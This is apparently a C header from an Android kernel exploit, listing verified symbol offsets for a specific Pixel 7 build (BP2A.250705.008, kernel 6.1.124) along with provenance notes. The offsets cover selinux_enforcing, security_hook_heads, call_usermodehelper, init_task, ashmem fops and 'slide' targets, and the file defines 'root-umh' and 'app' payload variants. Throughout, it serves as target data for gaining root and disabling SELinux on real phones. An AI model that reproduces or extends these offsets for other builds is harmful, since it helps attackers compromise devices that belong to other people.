// panther — Pixel 7, Android 15 (QPR/feature drop)
// Build: BP2A.250705.008
// Kernel: 6.1.124-android14-11-g8d713f9e8e7b-ab13202960  (KMI android14-6.1)
// CI build: 13202960 (kernel_aarch64, clang 17, PGO/BOLT/LTO)
//
// PROVENANCE
// ==========
...
//
//  1. Symbol addresses — the unstripped vmlinux for CI build 13202960
//     (kernel-vmlinux/13202960-vmlinux, llvm-nm, 130619 symbols), whose
//     .text section was verified byte-identical to the kernel Image
//     unpacked (magiskboot) from boot/61124/boot.img (md5 of .text
...
//     (CONFIG_DEBUG_INFO_BTF=y, .BTF at file offset 0x1651ff0, magic
...
//
// Kernel line 6.1.124 (March 2025) sits between the 6.1.75 and 6.1.145
// builds. The android14-6.1 KMI is frozen, so every struct offset in this
// header is byte-identical to the other 6.1 headers (BTF-verified here,
// not assumed); only the symbol addresses moved, and they were all
// re-extracted from THIS build. As on 6.1.75, this build's .data starts
// at 0x1fc0000 (not 0x2000000), so .data symbols carry 0x1fcxxxx-style
// offsets and the FIND_OFFSET_EN.md "digit-drop" heuristic (".data must
// start with 0x02") does not apply verbatim — the arithmetic
// addr - KIMAGE_TEXT_BASE is what was used, verified against the ELF
// section table.
//
...
// is identical to tegu/tokay-AD1A (see that note below).

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "panther-BP2A.250705.008-app"
#else
#define BUILD_VARIANT_LABEL "panther-BP2A.250705.008-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/panther/panther:15/BP2A.250705.008/13578956:user/release-keys"
#endif
...
// PHYS_OFFSET inherited from the same-device gs201 targets (panther
// CP2A.260705.006, lynx): gs201 DRAM base 0x80000000. The vendor_kernel_boot
// DTB was inspected for a memory node, but gs201 DTBs declare RAM at boot
// (no static memory@ node with a reg), so the SoC-fixed value is used;
// the existing panther target on this exact device uses the same value.
// text_offset=0 (Image header) ⇒ kernel loaded at 0x80000000.
...
// ── Kernel symbol offsets (llvm-nm on vmlinux 13202960, by name) ────────
#define ASHMEM_IOCTL_OFF            0x00c28e58ULL
#define ASHMEM_MMAP_OFF             0x00c29798ULL
#define ASHMEM_OPEN_OFF             0x00c299b8ULL
#define ASHMEM_RELEASE_OFF          0x00c29a40ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c29b60ULL
#define ASHMEM_FOPS_OFF             0x0126bea8ULL
...
// `ashmem_miscs[]` as on 6.1.157. Verified empirically: the pointer at
// ashmem_misc+0x10 == &ashmem_fops, name "ashmem", minor 255.
//
...
#define ASHMEM_MISC_FOPS_OFF        0x0213b678ULL /* ashmem_misc(0x213b668) + 0x10 */
...
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c29740ULL

#define CONFIGFS_READ_ITER_OFF      0x045f094ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x045f5c4ULL
#define NOOP_LLSEEK_OFF             0x0393f98ULL
#define INIT_TASK_OFF               0x1fdf600ULL
#define ROOT_TASK_GROUP_OFF         0x21c5580ULL
#define SELINUX_BLOB_SIZES_OFF      0x15b39e8ULL
#define SECURITY_HOOK_HEADS_OFF     0x15b32d8ULL
#define KMALLOC_CACHES_OFF          0x15b2e18ULL
#define ANON_PIPE_BUF_OPS_OFF       0x10f5a50ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00d2cccULL
#define SYSTEM_UNBOUND_WQ_OFF       0x1fcae60ULL
...
#define COPY_SPLICE_READ_OFF        0x03e173cULL /* generic_file_splice_read */
...
#define SELINUX_ENFORCING_OFF       0x22173d0ULL /* selinux_state + 0x0 */
...
#define SLIDE_NFULNL_LOGGER_OFF     0x1fd29c8ULL
...
//
// Cross-check: nfulnl_logger - loggers[0][1] = 0x1fd29c8 - 0x1fd2918 =
// 0xb0 — the same distance measured on 6.1.75, 6.1.145 and 6.1.157. A
// consistent array layout across four android14-6.1 builds confirms it.
#define SLIDE_LOGGERS_0_1_OFF       0x1fd2918ULL /* loggers(0x1fd2910) + 8 */
...
// walking random_table (0x20f6bc8) in 0x40-byte struct ctl_table strides
...
// 0xffffffc00a238458 == &sysctl_bootid; uuid entry has .data == NULL.
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x20f6cd0ULL /* &random_table[4].data */

#define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF     0x2238458ULL
...
// byte-identical to the 6.1.75 and 6.1.157 measurements, confirming the
// stack frames are compiler-stable across the android14-6.1 line. With
// the waiter being 0x58 bytes (11 words), words 3..13 are used, which
// still lands inside in/out/ex (words 0..14).
...
// and shmem_fallocate exist in this kernel (0x0e49b6c / 0x02e...), so
...
// stack frames of this build are identical to the 6.1.75/.157
// measurements (verified above for the slide path), so the same shift
// applies.
